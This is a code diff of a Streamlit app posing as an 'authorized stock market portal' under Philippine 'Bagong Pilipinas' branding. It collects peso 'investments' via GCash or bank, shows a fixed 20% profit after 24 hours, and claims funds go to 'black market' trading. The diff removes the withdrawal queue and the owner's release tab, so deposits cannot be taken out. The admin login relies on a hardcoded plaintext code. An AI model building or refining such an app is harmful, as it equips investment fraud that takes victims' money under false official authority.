@@ -26,6 +26,14 @@ st.markdown("""
         font-size: 2.2em;
         line-height: 1.2;
     }
+    .info-box {
+        background-color: #f8fafc;
+        padding: 20px;
+        border-radius: 15px;
+        border: 1px solid #0038a8;
+        margin-bottom: 20px;
+        color: #1e293b;
+    }
 </style>
 """, unsafe_allow_html=True)
 
@@ -33,7 +41,7 @@ st.markdown("""
 st.markdown('<p class="logo-text">🇵🇭 BAGONG<br>PILIPINAS</p>', unsafe_allow_html=True)
 st.markdown("<p style='text-align: center; color: #64748b; font-weight: bold;'>AUTHORIZED STOCK MARKET PORTAL</p>", unsafe_allow_html=True)
 
-# --- 4. SESSION STATE (MEMORY) ---
+# --- 4. SESSION STATE ---
 if 'page' not in st.session_state:
     st.session_state.page = "login"
 if 'db_user' not in st.session_state:
@@ -42,23 +50,18 @@ if 'deposits' not in st.session_state:
     st.session_state.deposits = []
 if 'pending_deposits' not in st.session_state:
     st.session_state.pending_deposits = [] 
-if 'pending_withdrawals' not in st.session_state:
-    st.session_state.pending_withdrawals = []
 
 # --- 5. PAGE: LOGIN ---
 if st.session_state.page == "login":
     st.subheader("LOGIN")
-    # Ang Name ay naka-Caps pa rin para sa uniformity
     l_name = st.text_input("FULL NAME").upper()
-    # DITO BINAGO: Inalis ang .upper() para tanggapin ang lowercase sa password
     l_pin = st.text_input("PASSWORD / PIN", type="password")
     
     if st.button("ENTER MARKET"):
-        # OWNER LOGIN - Case sensitive na ito (dapat eksaktong Black01!)
-        if l_name == "ADMIN" and l_pin == "Black01!":
+        # UPDATED OWNER LOGIN - New Secret Code: 090807
+        if l_name == "ADMIN" and l_pin == "090807":
             st.session_state.page = "admin"
             st.rerun()
-        # USER LOGIN
         elif st.session_state.db_user and l_name == st.session_state.db_user['name'] and l_pin == st.session_state.db_user['pin']:
             st.session_state.page = "dashboard"
             st.rerun()
@@ -76,7 +79,6 @@ elif st.session_state.page == "signup":
     reg_name = st.text_input("FULL NAME").upper()
     reg_address = st.text_input("FULL ADDRESS").upper()
     st.markdown("---")
-    # Para sa normal users, 6 numbers pa rin ang requirement
     pin1 = st.text_input("CREATE 6-DIGIT PIN", type="password", max_chars=6)
     pin2 = st.text_input("VERIFY 6-DIGIT PIN", type="password", max_chars=6)
 
@@ -88,43 +90,43 @@ elif st.session_state.page == "signup":
             st.session_state.page = "login"
             st.rerun()
         else:
-            st.error("ANG PIN AY DAPAT 6 NA NUMERO")
+            st.error("PIN MUST BE 6 NUMBERS")
 
-# --- 7. PAGE: OWNER ADMIN PANEL ---
+# --- 7. PAGE: OWNER ADMIN ---
 elif st.session_state.page == "admin":
     st.subheader("👑 OWNER DASHBOARD")
-    st.write(f"Welcome back, Boss {st.session_state.page}!")
-    
-    tab1, tab2 = st.tabs(["📥 PENDING DEPOSITS", "📤 PENDING WITHDRAWALS"])
-    
-    with tab1:
-        if not st.session_state.pending_deposits:
-            st.info("Walang pending na deposito.")
-        for i, dep in enumerate(st.session_state.pending_deposits):
-            st.write(f"User: {dep['user']} | Amount: ₱{dep['amount']:,}")
-            if st.button("APPROVE", key=f"adep_{i}"):
-                st.session_state.deposits.append({"amount": dep['amount'], "release_time": datetime.now() + timedelta(hours=24), "profit": dep['amount'] * 0.20})
-                st.session_state.pending_deposits.pop(i)
-                st.rerun()
-
-    with tab2:
-        if not st.session_state.pending_withdrawals:
-            st.info("Walang pending na withdrawal.")
-        for i, wit in enumerate(st.session_state.pending_withdrawals):
-            st.write(f"User: {wit['user']} | Amount: ₱{wit['amount']:,}")
-            if st.button("RELEASE", key=f"awit_{i}"):
-                st.session_state.pending_withdrawals.pop(i)
-                st.rerun()
-
+    if not st.session_state.pending_deposits:
+        st.info("No pending deposits.")
+    for i, dep in enumerate(st.session_state.pending_deposits):
+        st.write(f"User: {dep['user']} | Amount: ₱{dep['amount']:,}")
+        if st.button("APPROVE", key=f"adep_{i}"):
+            st.session_state.deposits.append({"amount": dep['amount'], "release_time": datetime.now() + timedelta(hours=24), "profit": dep['amount'] * 0.20})
+            st.session_state.pending_deposits.pop(i)
+            st.rerun()
     if st.button("LOGOUT"):
         st.session_state.page = "login"
         st.rerun()
 
 # --- 8. PAGE: USER DASHBOARD ---
 elif st.session_state.page == "dashboard":
+    st.markdown(f"""
+    <div class="info-box">
+        <h3 style="color:#0038a8; margin-top:0;">📊 HOW YOUR CAPITAL WORKS</h3>
+        <p><b>YOUR EVERY PENNY IS USED TO TRADE IN THE STOCK MARKET OR BLACK MARKET INTERNATIONAL TRADING OF COMMODITIES AND ETC.</b></p>
+        <p>We utilize specialized global trading routes and high-frequency market strategies to ensure your investment grows at an accelerated rate compared to traditional banking. By diversifying into international commodities and niche markets, we secure the high returns our platform is known for.</p>
+    </div>
+    """, unsafe_allow_html=True)
+
     total_balance = sum(d['amount'] for d in st.session_state.deposits) + sum(d['profit'] for d in st.session_state.deposits)
     st.metric("TOTAL BALANCE", f"₱{total_balance:,.2f}")
+
+    st.subheader("📥 INVEST (GCASH / BANK)")
+    selected_amt = st.selectbox("PESO AMOUNT", [100, 500, 1000, 5000, 10000, 20000, 30000, 50000])
     
+    if st.button(f"PROCEED TO PAY ₱{selected_amt:,}"):
+        st.session_state.pending_deposits.append({"user": st.session_state.db_user['name'], "amount": float(selected_amt)})
+        st.success("Investment Request Sent to Owner!")
+
     if st.button("LOGOUT"):
         st.session_state.page = "login"
         st.rerun()
